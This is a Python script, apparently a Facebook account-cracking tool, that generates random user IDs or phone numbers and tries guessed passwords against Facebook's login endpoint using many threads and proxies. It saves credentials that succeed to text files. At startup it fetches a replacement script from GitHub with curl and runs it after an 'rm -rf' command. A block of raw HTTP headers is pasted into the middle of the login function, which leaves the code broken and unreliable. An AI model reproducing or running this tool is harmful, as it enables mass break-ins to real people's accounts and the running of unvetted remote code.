#coding=utf
#DECODE BY HASAAN MIRZA
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python ali.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """   
    
          ###     ######     ###    ########  
         ## ##   ##    ##   ## ##   ##     ## 
        ##   ##  ##        ##   ##  ##     ## 
       ##     ##  ######  ##     ## ##     ## 
       #########       ## ######### ##     ## 
       ##     ## ##    ## ##     ## ##     ## 
       ##     ##  ######  ##     ## ########  

══════════════════════════════════════════════════
  Author       : Hasaan Mirza
  Github      : Hasaan-Mirza
  TOOLS STATUS : Free
  Facebook      : Thiie'w HaSu
══════════════════════════════════════════════════"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def HASU():
    os.system('clear')
    print(logo)
    print('[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            Request Method: GET
Status Code: 200 
Remote Address: 157.240.227.1:443
Referrer Policy: origin-when-cross-origin
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
cache-control: private, no-cache, no-store, must-revalidate
content-encoding: br
content-security-policy: default-src data: blob: 'self' https://*.fbsbx.com 'unsafe-inline' *.facebook.com 'unsafe-eval' *.fbcdn.net;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.google.com 127.0.0.1:* 'unsafe-inline' 'unsafe-eval' blob: data: 'self' connect.facebook.net;style-src fonts.googleapis.com *.fbcdn.net data: *.facebook.com 'unsafe-inline';connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net wss://*.facebook.com:* wss://*.whatsapp.com:* wss://*.fbcdn.net attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' wss://gateway.facebook.com wss://edge-chat.facebook.com wss://snaptu-d.facebook.com wss://kaios-d.facebook.com/ v.whatsapp.net *.fbsbx.com *.fb.com;font-src data: *.gstatic.com *.facebook.com *.fbcdn.net *.fbsbx.com;img-src *.fbcdn.net *.facebook.com data: https://*.fbsbx.com *.tenor.co media.tenor.com facebook.com *.cdninstagram.com fbsbx.com fbcdn.net *.giphy.com connect.facebook.net *.carriersignal.info blob: android-webview-video-poster: googleads.g.doubleclick.net www.googleadservices.com *.whatsapp.net *.fb.com *.oculuscdn.com;media-src *.cdninstagram.com blob: *.fbcdn.net *.fbsbx.com www.facebook.com *.facebook.com https://*.giphy.com data:;frame-src *.doubleclick.net *.google.com *.facebook.com www.googleadservices.com *.fbsbx.com fbsbx.com data: www.instagram.com *.fbcdn.net https://paywithmybank.com;worker-src blob: *.facebook.com data:;
content-security-policy-report-only: default-src data: blob: 'self' https://*.fbsbx.com 'unsafe-inline' *.facebook.com 'unsafe-eval' *.fbcdn.net;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.google.com 127.0.0.1:* 'unsafe-inline' 'unsafe-eval' blob: data: 'self' connect.facebook.net;style-src fonts.googleapis.com *.fbcdn.net data: *.facebook.com 'unsafe-inline';connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net wss://*.facebook.com:* wss://*.whatsapp.com:* wss://*.fbcdn.net attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' wss://gateway.facebook.com wss://edge-chat.facebook.com wss://snaptu-d.facebook.com wss://kaios-d.facebook.com/ v.whatsapp.net *.fbsbx.com *.fb.com;font-src data: *.gstatic.com *.facebook.com *.fbcdn.net *.fbsbx.com;img-src *.fbcdn.net *.facebook.com data: https://*.fbsbx.com *.tenor.co media.tenor.com facebook.com *.cdninstagram.com fbsbx.com fbcdn.net *.giphy.com connect.facebook.net *.carriersignal.info blob: android-webview-video-poster: googleads.g.doubleclick.net www.googleadservices.com *.whatsapp.net *.fb.com *.oculuscdn.com;media-src *.cdninstagram.com blob: *.fbcdn.net *.fbsbx.com www.facebook.com *.facebook.com https://*.giphy.com data:;frame-src *.doubleclick.net *.google.com *.facebook.com www.googleadservices.com *.fbsbx.com fbsbx.com data: www.instagram.com *.fbcdn.net https://paywithmybank.com;worker-src blob: *.facebook.com data:;report-uri https://www.facebook.com/csp/reporting/?minimize=0;
content-type: application/json
cross-origin-opener-policy: same-origin-allow-popups
cross-origin-resource-policy: same-origin
document-policy: force-load-at-top
pragma: no-cache
priority: u=2
report-to: {"max_age":259200,"endpoints":[{"url":"https:\/\/mbasic.facebook.com\/ajax\/mtouch_error_reports\/?device_level=low"}]}
reporting-endpoints: default="https://mbasic.facebook.com/ajax/mtouch_error_reports/?device_level=low"
strict-transport-security: max-age=15552000; preload
vary: Accept-Encoding
x-content-type-options: nosniff
x-fb-debug: ExUzYuTEQ9LvB96dlzHipFonON0oborr/crlCOmgRkzfK2q9L9iIFQ6N8AoWv/Hi00CwSq4kN/XiMxxD5l0sAw==
x-fb-rlafr: 0
x-frame-options: DENY
x-xss-protection: 0
:authority: mbasic.facebook.com
:method: GET
:path: /data/manifest/
:scheme: https
accept: */*
accept-encoding: gzip, deflate, br
accept-language: en-US,en;q=0.9
referer: https://mbasic.facebook.com/home.php?ref_component=mbasic_home_header&ref_page=MFriendsCenterRequestsController
sec-ch-ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-dest: manifest
sec-fetch-mode: cors
sec-fetch-site: same-origin
user-agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[HASU-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[HASU-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

HASU()
